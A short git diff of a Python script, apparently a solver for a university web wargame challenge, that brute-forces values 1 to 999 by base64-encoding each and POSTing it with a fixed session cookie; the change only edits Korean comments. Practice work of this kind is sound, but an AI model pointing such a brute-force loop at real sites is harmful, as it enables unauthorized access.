@@ -99,9 +99,9 @@ URL = 'http://wargame_sec.kongju.ac.kr/web/find/prob.php'
 
     for i in range(1,1000): #1000번 반복 
         point = base64.encodestring(str.encode(str(i)))[:-1] #base64 코드를 point로 저장 하지만 뒤 값은 null이기때문에 지운다.
-        data = {'HaHa':point} #HaHa에 point 를 입력
+        data = {'HaHa':point} #HaHa에 point 라는 dictionary 만듬
         cookies = {'PHPSESSID' : 'v7mteq0os1qvh6imevk98uam31'} #cookie값으로 identity
-        res = requests.post(URL,data=data, cookies=cookies) #web에 post
+        res = requests.post(URL,data=data, cookies=cookies) #web 에 post
         print("attemp : {0}".format(i))
 
     print(res.text[:res.text.find('<body>')+100]) #html파일에 있는 코드중 <body>에서 다음 100줄까지 출력
